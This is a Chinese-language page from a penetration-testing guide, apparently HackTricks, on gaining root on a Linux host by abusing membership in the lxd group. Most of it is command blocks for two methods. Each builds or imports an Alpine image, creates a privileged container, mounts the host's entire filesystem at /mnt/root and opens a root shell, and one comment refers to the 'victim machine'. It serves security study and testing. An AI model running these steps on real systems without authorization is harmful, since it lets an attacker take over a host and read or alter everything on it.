# lxd/lxc Group - Privilege escalation

{{#include ../../../banners/hacktricks-training.md}}

属于主机的 LXD 管理组（通常为 _**lxd**）_，可以通过允许完全控制 daemon 来获得 root 权限路径。<sup>[[1]](#references)</sup>

## 在没有 internet 的情况下利用

### Method 1

你可以从可信 repository 下载 Alpine image，以便与 LXD 配合使用。
Canonical 的 LXD image server 每天发布构建版本：[https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
只需从最新构建版本中获取 **lxd.tar.xz** 和 **rootfs.squashfs**（目录名称为日期）。<sup>[[8]](#references)</sup>

或者，你可以按照 [project instructions](https://github.com/lxc/distrobuilder) 在自己的机器上安装 distrobuilder。<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```
上传 **incus.tar.xz**（如果从 Canonical image server 下载，则为 **lxd.tar.xz**）和 **rootfs.squashfs**，然后导入镜像并创建容器。<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> 如果遇到此错误 _**Error: No storage pool found. Please create a new storage pool**_\
> 运行 **`lxd init`**，设置一个默认 storage pool，然后**重复**上一段命令。<sup>[[2]](#references)</sup>

最后，启动 container，并在 host filesystem 上打开 root shell：<sup>[[1]](#references)[[2]](#references)</sup>
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### 方法 2

构建一个 Alpine image，并使用 flag `security.privileged=true` 启动它，该 flag 会将 container root 映射为 host root；随后挂载 `/`，即可将 host filesystem 暴露在 container 内部。<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
## References

- [1] [如何强化 LXD 的安全性](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [LXD 容器和虚拟机](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [如何复制和导入 images](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [如何使用 distrobuilder 构建 images](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Alpine image 定义](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [lxd-alpine-builder 构建脚本](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [LXD image server](https://images.lxd.canonical.com/)
- [9] [类型：disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
{{#include ../../../banners/hacktricks-training.md}}
